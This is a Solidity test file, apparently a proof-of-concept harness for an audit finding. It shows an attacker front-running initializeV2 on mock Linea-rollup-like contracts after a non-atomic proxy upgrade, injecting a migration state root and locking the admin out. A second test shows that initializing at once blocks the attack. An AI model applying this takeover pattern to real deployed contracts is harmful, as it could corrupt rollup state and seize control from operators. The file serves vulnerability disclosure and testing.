// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {
    ILineaRollupV2Like,
    LineaF2SimpleProxy,
    LineaRollupV1Like,
    LineaRollupInitV2Like,
    LineaF2InitV2Attacker
} from "../src/LineaF2InitV2UpgradeGapHarness.sol";

interface Vm {
    function prank(address msgSender) external;
}

/// @notice Deterministic witness tests for initializeV2 first-caller takeover
/// in a non-atomic upgrade flow.
contract LineaF2InitV2UpgradeGapTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_attacker_can_front_run_initializeV2_after_non_atomic_upgrade() public {
        address admin = address(0xA11CE);
        address attackerEOA = address(0xBEEF);
        uint256 attackerBlock = 777_777;
        bytes32 attackerRoot = keccak256("attacker-root");

        LineaRollupV1Like implementationV1 = new LineaRollupV1Like();
        LineaRollupInitV2Like implementationV2 = new LineaRollupInitV2Like();
        LineaF2SimpleProxy proxy = new LineaF2SimpleProxy(admin);
        ILineaRollupV2Like rollup = ILineaRollupV2Like(address(proxy));
        LineaF2InitV2Attacker attacker = new LineaF2InitV2Attacker();
        vm.prank(admin);
        proxy.upgradeTo(address(implementationV1));

        vm.prank(admin);
        rollup.initialize(100);
        require(rollup.currentL2BlockNumber() == 100, "v1 initialize should set baseline block");
        require(rollup.initializedVersion() == 1, "initializer version should be 1 after v1 init");

        // Admin performs non-atomic upgrade without call data.
        vm.prank(admin);
        proxy.upgradeTo(address(implementationV2));

        // Any external caller can now consume reinitializer(3) first.
        vm.prank(attackerEOA);
        attacker.seizeMigrationState(address(proxy), attackerBlock, attackerRoot);

        require(rollup.currentL2BlockNumber() == attackerBlock, "attacker must rewrite migration block");
        require(rollup.stateRootHashes(attackerBlock) == attackerRoot, "attacker must inject migration state root");
        require(rollup.initializedVersion() == 3, "attacker should consume reinitializer version");

        vm.prank(admin);
        (bool ok,) = address(proxy).call(
            abi.encodeWithSelector(ILineaRollupV2Like.initializeV2.selector, 101, bytes32(uint256(0x1234)))
        );
        require(!ok, "admin should be locked out once attacker consumes initializeV2");
    }

    function test_attacker_loses_if_admin_calls_initializeV2_immediately() public {
        address admin = address(0xA11CE);
        address attackerEOA = address(0xBEEF);

        LineaRollupV1Like implementationV1 = new LineaRollupV1Like();
        LineaRollupInitV2Like implementationV2 = new LineaRollupInitV2Like();
        LineaF2SimpleProxy proxy = new LineaF2SimpleProxy(admin);
        ILineaRollupV2Like rollup = ILineaRollupV2Like(address(proxy));

        vm.prank(admin);
        proxy.upgradeTo(address(implementationV1));
        vm.prank(admin);
        rollup.initialize(200);

        vm.prank(admin);
        proxy.upgradeTo(address(implementationV2));
        vm.prank(admin);
        rollup.initializeV2(201, bytes32(uint256(0xAAAA)));

        vm.prank(attackerEOA);
        (bool ok,) = address(proxy).call(
            abi.encodeWithSelector(
                LineaF2InitV2Attacker.seizeMigrationState.selector, address(proxy), 999, keccak256("late-attacker")
            )
        );
        require(!ok, "attacker should fail if admin atomically/immediately initializes");
    }
}
